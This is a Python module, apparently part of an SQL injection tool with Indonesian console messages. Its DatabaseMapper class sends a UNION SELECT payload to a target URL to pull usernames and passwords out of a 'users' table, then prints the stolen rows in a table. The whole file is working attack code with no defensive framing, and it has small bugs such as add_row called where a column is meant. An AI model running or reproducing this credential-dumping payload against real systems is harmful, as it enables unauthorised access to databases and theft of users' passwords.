import json
from urllib.parse import quote
from core.client import HTTPClient
from utils.logger import (
    log_error, 
    log_info, log_success, 
    print_database_table
)

from rich.table import Table

from rich.console import Console

console = Console()

class DatabaseMapper:
    def __init__(self, client:HTTPClient):
        self.client = client
    def dump_database(self, base_url : str):
        console.print(
        "\n[bold yellow][*] Memulai proses ekstraksi data (Dumping)...[/bold"
        " yellow]"
        )

        payload = " ' UNION SELECT id, username || ' - ' || password from users--"

        #kirim payload ke target
        response = self.client.send_payload(base_url, quote(payload))

        if response["success"] and response["status_code"] == 200:
            console.print(
                "[bold green][+] Berhasil menerima respons dari"
                " target![/bold green]"
            )

            try:
                data = json.loads(response["text"])
                self.display_table_data(data.get("data", []))
            except json.JSONDecodeError:
                console.print(
                    "[cyan][i] Menganalisis respons teks mentah...[/cyan][/i]"
                )
                print(response["text"][:1000])
        else:
            console.print(
                "[bold red][!] Gagal mengekstrak data dari target.[/bold red]"
            )

    def display_table_data(self, rows):
        table = Table(title="Hasil Ekstraksi Data Database (SQLi Dump)")
        table.add_column("ID / Kolom 1", style="cyan", no_wrap= True)
        table.add_row("Data / Kolom 2", style="magenta")

        if not rows:
            table.add_row("Kosong", "Tidak ada data yang berhasil ditarik.")
        else:
            for row in rows:
                col1 = str(row[0]) if len(row) > 0 else ""
                col2 = str(row[1]) if len(row) > 1 else ""
                table.add_row(col1, col2)

            console.print(table)